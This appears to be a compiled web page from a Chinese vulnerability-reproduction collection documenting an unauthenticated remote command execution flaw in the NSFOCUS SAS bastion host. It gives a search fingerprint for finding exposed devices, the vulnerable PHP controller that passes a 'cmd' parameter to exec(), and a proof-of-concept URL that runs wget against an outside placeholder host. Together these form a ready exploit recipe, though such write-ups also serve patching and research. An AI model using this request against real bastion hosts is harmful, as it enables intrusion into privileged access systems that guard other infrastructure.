import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const s={},t=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>绿盟 SAS堡垒机 Exec 远程命令执行漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>绿盟 SAS堡垒机</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;&#39;/needUsbkey.php?username=&#39;&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828162656143.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞存在于文件 ExecController.php 文件中</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828162917436.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
  require_once &#39;Nsc/Websvc/Response.php&#39;;
class ExecController extends Cavy_Controller_Action {

  var $models = &#39;no&#39;;

  public function index() {
    $command = $this-&gt;_params[&#39;cmd&#39;];
    $ret = 0;
    $output = array();
    exec($command,$output,$ret);
    $result = new StdClass;
    if ($ret != 0) {
      $result-&gt;code = Nsc_Websvc_Response::EXEC_ERROR;
      $result-&gt;text = &quot;exec error&quot;;
    }
    else {
      $result-&gt;code = Nsc_Websvc_Response::SUCCESS;
      //			$result-&gt;text = implode(&quot;\\n&quot;,$output);
      $result-&gt;text = &quot;WEBSVC OK&quot;;
    }
    $this-&gt;_render(array(&#39;result&#39;=&gt;$result),&#39;/websvc/result&#39;);
  }
}
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/webconf/Exec/index?cmd=wget%20xxx.xxx.xxx
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828162933312.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828162948491.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),d=[t];function r(l,c){return i(),n("div",null,d)}const v=e(s,[["render",r],["__file","绿盟 SAS堡垒机 Exec 远程命令执行漏洞.html.vue"]]);export{v as default};
